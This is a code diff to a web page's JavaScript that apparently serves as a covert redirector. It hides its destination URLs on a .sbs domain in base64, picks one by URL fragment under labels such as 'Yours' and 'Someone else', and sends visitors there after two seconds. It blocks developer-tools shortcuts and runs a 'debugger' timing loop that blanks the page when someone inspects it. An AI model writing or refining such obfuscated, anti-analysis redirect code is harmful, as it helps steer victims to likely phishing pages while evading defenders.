@@ -45,50 +45,40 @@
             if (e.ctrlKey && e.shiftKey && e.keyCode === 67) { e.preventDefault(); return false; }
         });
 
-        // --- Destination routing by fragment ---
+        // Destination routing by fragment
         var ROUTES = {
-            '1': 'aHR0cHM6Ly9icnV4dGVud2VuLnNicy9tb3Zpbmd5b3U5OTk=',
-            '2': 'aHR0cHM6Ly9icnV4dGVud2VuLnNicy9qdWxseTIzMi9tb250eXkzMw=='
+            '1': 'aHR0cHM6Ly9icnV4dGVud2VuLnNicy9tb3Zpbmd5b3U5OTk=', // Default (Yours) 
+            '2': 'aHR0cHM6Ly9icnV4dGVud2VuLnNicy9qdWxseTIzMi9tb250eXkzMw=='  // #2 (Someone else) ->
         };
 
         function pickDestination() {
+            // Read the hash and strip the '#'
             var hash = window.location.hash.replace(/^#/, '');
 
-            if (!hash && document.referrer) {
-                var refHash = document.referrer.split('#')[1];
-                if (refHash) hash = refHash;
+            // If the hash is missing or doesn't exist in ROUTES, FORCE it to '1'
+            if (!hash || !ROUTES[hash]) {
+                hash = '1';
             }
 
-            if (!hash || !ROUTES[hash]) hash = '1';
-
+            // Decode and return. If base64 is corrupted, fallback to '1'.
             try {
-                var decoded = atob(ROUTES[hash]);
-                // sanity: must look like a URL
-                if (!/^https?:\/\//i.test(decoded)) {
-                    decoded = atob(ROUTES['1']);
-                }
-                return decoded;
+                return atob(ROUTES[hash]);
             } catch (err) {
                 return atob(ROUTES['1']);
             }
         }
 
-        // Fire the redirect FIRST, before any anti-debug interval can nuke the page.
         var destination = pickDestination();
-        // uncomment the next line temporarily if you want to debug in console:
-        // console.log('[route]', window.location.hash, '->', destination);
 
         setTimeout(function() {
             window.location.replace(destination);
         }, 2000);
 
-        // Anti-debug interval moved AFTER the redirect is scheduled,
-        // and relaxed so background tabs don't false-positive.
+        // Anti-debug loop
         setInterval(function() {
             var start = performance.now();
             debugger;
             var end = performance.now();
-            // only nuke if the pause was severe AND we're still on this page
             if (end - start > 250 && document.visibilityState === 'visible') {
                 window.location.replace('about:blank');
             }
